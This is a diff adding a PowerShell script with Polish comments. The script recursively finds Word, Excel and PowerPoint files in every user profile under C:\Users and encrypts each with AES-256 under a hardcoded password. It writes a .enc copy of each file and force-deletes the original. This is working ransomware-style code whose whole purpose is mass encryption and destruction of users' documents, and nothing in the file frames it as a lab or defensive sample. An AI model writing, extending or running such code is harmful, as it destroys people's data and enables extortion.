@@ -1,0 +1,153 @@
+function Encrypt-FileAES256 {
+ 
+    param(
+ 
+        [Parameter(Mandatory=$true)]
+ 
+        [string]$InputFile,
+ 
+       
+ 
+        [Parameter(Mandatory=$true)]
+ 
+        [string]$OutputFile,
+ 
+       
+ 
+        [Parameter(Mandatory=$true)]
+ 
+        [string]$Password
+ 
+    )
+ 
+   
+ 
+    $salt = New-Object byte[] 16
+ 
+    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($salt)
+ 
+   
+ 
+    $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 10000)
+ 
+    $key = $deriveBytes.GetBytes(32)  #klucz
+ 
+    $iv = $deriveBytes.GetBytes(16)   # wektor inicjujący
+ 
+   
+ 
+    # AES parametry
+ 
+    $aes = [System.Security.Cryptography.AesManaged]::Create()
+ 
+    $aes.KeySize = 256
+ 
+    $aes.BlockSize = 128
+ 
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+ 
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+ 
+    $aes.Key = $key
+ 
+    $aes.IV = $iv
+ 
+   
+ 
+    $fsOut = [System.IO.File]::Open($OutputFile, [System.IO.FileMode]::Create)
+ 
+    $fsOut.Write($salt, 0, $salt.Length)
+ 
+   
+ 
+    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fsOut, $aes.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
+ 
+    $fsIn = [System.IO.File]::OpenRead($InputFile)
+ 
+    $buffer = New-Object byte[] 4096
+ 
+    while (($bytesRead = $fsIn.Read($buffer, 0, $buffer.Length)) -gt 0)
+ 
+    {
+ 
+        $cryptoStream.Write($buffer, 0, $bytesRead)
+ 
+    }
+ 
+   
+ 
+    $cryptoStream.FlushFinalBlock()
+ 
+    $cryptoStream.Close()
+ 
+    $fsIn.Close()
+ 
+    $fsOut.Close()
+ 
+   
+ 
+    Write-Output "File '$InputFile' '$OutputFile' ENCRYPTED"
+ 
+}
+ 
+ 
+function Find-UserFiles
+ 
+{
+ 
+    $userRoot = "C:\Users"
+ 
+    $excludeDirs = @("All Users", "Default", "Default User", "Public")
+ 
+    $foundFiles = @()
+ 
+    $extensions = @("*.docx", "*.xlsx", "*.pptx")
+ 
+   
+ 
+    $dirs = Get-ChildItem -Path $userRoot -Directory | Where-Object { $excludeDirs -notcontains $_.Name }
+ 
+   
+ 
+    foreach ($dir in $dirs) {
+ 
+        foreach ($ext in $extensions) {
+ 
+            $files = Get-ChildItem -Path $dir.FullName -Recurse -File -Filter $ext -ErrorAction SilentlyContinue
+ 
+            $foundFiles += $files
+ 
+        }
+ 
+    }
+ 
+   
+ 
+    return $foundFiles
+ 
+}
+ 
+ 
+$password = "MojeSuperTajneHaslo"
+ 
+$filesToEncrypt = Find-UserFiles
+ 
+ 
+foreach ($file in $filesToEncrypt)
+ 
+{
+ 
+    # file encrypt .enc
+ 
+    $outputFile = "$($file.FullName).enc"
+ 
+    Write-Output "Encrypting $($file.FullName)" #debug
+ 
+    Encrypt-FileAES256 -InputFile $file.FullName -OutputFile $outputFile -Password $password
+ 
+   Remove-Item -Path $file.FullName -Force
+ 
+}
+ 
+Write-Output "END"
+ 
